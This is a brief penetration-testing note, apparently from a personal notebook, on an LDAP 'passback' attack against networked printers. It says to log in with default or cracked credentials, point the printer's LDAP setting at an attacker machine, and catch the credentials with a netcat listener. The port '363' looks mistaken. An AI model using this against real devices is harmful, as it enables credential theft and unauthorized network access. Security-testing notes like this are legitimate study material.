---
title: PASSBACK ATTACK
updated: 2023-09-29 05:02:03Z
created: 2023-09-29 05:00:15Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# PASSBACK ATTACK
When a printer or MFD is on the network with default credentials (or cracked credentials), update the ldap/s setting to point to hacker target IP

On hacker target PC, run:
`netcat -ln 363` (or 636 for ldaps)